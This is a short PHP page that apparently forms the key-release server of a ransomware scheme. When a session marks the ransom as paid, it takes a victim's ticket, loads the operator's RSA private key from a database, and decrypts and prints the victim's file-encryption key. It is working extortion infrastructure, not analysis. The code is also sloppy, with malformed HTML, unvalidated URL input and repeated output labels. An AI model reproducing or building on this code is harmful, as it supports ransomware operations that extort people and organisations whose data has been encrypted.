<!DOCTYPE>
<head>
	<title></title>
</head>
<body>
	<div class="midcenter">
	<?php
		include("mods/keypair.php");
		include("mods/session.php");
		session_start();
		$link=Session::forceConnectDB();
		if(isset($_SESSION["paid_ransom"])){
			//Get RSA key identity
			$keyid=hex2bin(substr($_GET["ticket"],0,4));
			$keyid=ord($keyid[0])*256+ord($keyid[1]);
			
			//Prepare key
			$rsakey=(new KeyPair($can_decrypt=true))->sqlImport($link, $keyid);
			
			//Get symmetric key
			$bin_enc_key=hex2bin(substr($_GET["ticket"],4));
			$bin_dec_key=$rsakey->decrypt($bin_enc_key);
			$symkey=bin2hex($bin_dec_key);
			
						
			echo("RSA Key:".$keyid."<br>\n");
			echo("Decryption Key:".$bin_enc_key."<br>\n");
			echo("Decryption Key:".$bin_dec_key."<br>\n");
			echo("Decryption Key:".$symkey);
		}else{echo(":(");}
	?>
		
	</div>
</body>
</html>